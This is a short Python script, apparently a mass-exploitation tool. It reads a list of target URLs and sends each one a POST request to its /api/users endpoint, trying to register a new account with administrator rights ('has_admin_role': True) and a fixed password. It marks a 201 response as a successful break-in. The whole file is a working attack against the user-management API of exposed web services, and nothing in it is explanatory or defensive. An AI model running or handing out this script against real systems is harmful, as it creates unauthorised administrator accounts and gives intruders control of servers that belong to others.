#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# vim: set tabstop=4 shiftwidth=4 textwidth=120 expandtab :

import requests
import json
import csv
import sys
from concurrent.futures import ThreadPoolExecutor

is_debug = False

RED='\033[1;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
NONE='\033[0m'

def maybeCSRF(url):
    # TODO: why {"code":403,"message":"self-registration cannot be triggered via API"}
    print(f"{url}\t{YELLOW}{403}{NONE}")

def exp(url):
    url = url + '/api/users'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
        'Content-Type': 'application/json',
        }
    payload = {
        "username": "testadmin",
        "email": "test1@qq.com",
        "realname": "testadmin",
        "password": "Aa123456",
        "comment": "test1",
        "has_admin_role": True
        }
    payload = json.dumps(payload)
    try:
        requests.packages.urllib3.disable_warnings()
        r = requests.post(url, headers=headers, data=payload, timeout=2, verify=False)

        if r.status_code == 201:
            print(f"{url}\t{GREEN}{r.status_code}{NONE}")
        elif r.status_code == 400:
            print(f"{url}\t{YELLOW}{r.status_code}{NONE}")
        elif r.status_code == 403:
            # print(r.text)
            maybeCSRF(url)
        else:
            print(f"{url}\t{RED}{r.status_code}{NONE}")
    except Exception as why:
        pass


# main::start
if __name__ == '__main__':

    if len(sys.argv) < 2:
         print("Usage: {} {}".format(sys.argv[0], "/path/to/url_list_file"))
         exit()

    ip_port_file = sys.argv[1]

    # ip_port_file example
    #
    #   http://127.0.0.1:80
    #
    lines = []
    with open(ip_port_file, 'r', encoding='utf-8') as fh:
        lines = [ line.strip() for line in fh.readlines()]

    for line in lines:
        if not line.startswith('http'):
            url = 'http://' + line
        else:
            url = line

        if is_debug : print(url)
        # exploit
        exp(url)
